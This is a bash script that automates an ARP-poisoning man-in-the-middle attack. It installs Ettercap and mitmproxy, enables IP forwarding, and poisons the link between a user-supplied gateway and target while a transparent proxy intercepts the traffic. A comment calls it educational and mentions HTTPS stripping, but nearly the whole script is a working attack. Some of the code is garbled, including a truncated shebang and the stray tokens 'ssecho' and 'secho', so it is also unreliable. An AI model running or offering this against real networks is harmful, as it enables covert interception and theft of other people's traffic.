#!/bin/bas
# prompts for Gateway IP, Target IP, and network interface,
# compiles the Ettercap filter, and then runs Ettercap and mitmproxy
# in transparent mode.
#
# Note:
# - HTTPS is limited to HTTP redirection; for HTTPS interception, consider
#   using sslstrip or installing a trusted CA.
# - This script is for educational purposes only. Use it on networks
#   where you have explicit permission.

# ---------------------------
# Color Variables
# ---------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'  # No Color

# ---------------------------
# 1. Package Installation & Setup
# ---------------------------
echo -e "${BLUE}[*] Installing required packages...${NC}"
sudo apt-get install ettercap-common ettercap-graphical -y
pip3 install mitmproxy

echo -e "${BLUE}[*] Starting mitmproxy in transparent mode with showhost (non-blocking)...${NC}"
# Run mitmproxy in the background.
mitmproxy --mode transparent --showhost --set block_global=false &

echo -e "${BLUE}[*] Enabling IP forwarding...${NC}"
sudo sysctl -w net.ipv4.ip_forward=1

# ---------------------------
# 2. Get User Input for Network Parameters
# ---------------------------
echo -e "${YELLOW}[*] Please enter the following network parameters:${NC}"
read -p "$(echo -e ${YELLOW}[?] Enter the Gateway IP: ${NC})" GATEWAY_IP
read -p "$(echo -e ${YELLOW}[?] Enter the Target IP: ${NC})" TARGET_IP
read -p "$(echo -e ${YELLOW}[?] Enter the network interface (e.g., eth0): ${NC})" INTERFACE

# ---------------------------
# 3. Compile Ettercap Filter and Launch Ettercap
# ---------------------------
echo -e "${BLUE}[*] Compiling Ettercap filter...${NC}"
sudo etterfilter proxy_filter.ef -o proxy_filter.efilter

echo -e "${BLUE}[*] Running Ettercap (first run)...${NC}"
sudo ettercap -T -q -i "$INTERFACE" -F proxy_filter.efilter -M arp:remote /${GATEWAY_IP}// /${TARGET_IP}//

# (Optional) Uncomment the following block to recompile and run Ettercap a second time
#: <<'OPTIONAL'
#echo -e "${BLUE}[*] Recompiling Ettercap filter...${NC}"
#sudo etterfilter proxy_filter.ef -o proxy_filter.efilter
#
#ssecho -e "${BLUE}[*] Running Ettercap (second run)...${NC}"
#sudo ettercap -T -q -i "$INTERFACE" -F proxy_filter.efilter -M arp:remote /${GATEWAY_IP}// /${TARGET_IP}//
#OPTIONAL

# ---------------------------
# 4. Additional Runs for HTTPS/SSL Stripping
# ---------------------------
echo -e "${BLUE}[*] Starting mitmproxy (transparent mode) again with showhost...${NC}"
mitmproxy --mode transparent --showhost & secho -e "${BLUE}[*] Running Ettercap (final run) with user provided inputs...${NC}"
sudo ettercap -T -q -i "$INTERFACE" -F proxy_filter.efilter -M arp:remote /${GATEWAY_IP}// /${TARGET_IP}//

# ---------------------------
# 5. Clean Up
# ---------------------------
echo -e "${BLUE}[*] Disabling IP forwarding...${NC}"
sudo sysctl -w net.ipv4.ip_forward=0

echo -e "${BLUE}[*] Removing temporary Ettercap HTTP log...${NC}"
rm -f /tmp/ettercap_http.log

echo -e "${GREEN}[+] MITM setup complete. Exiting.${NC}"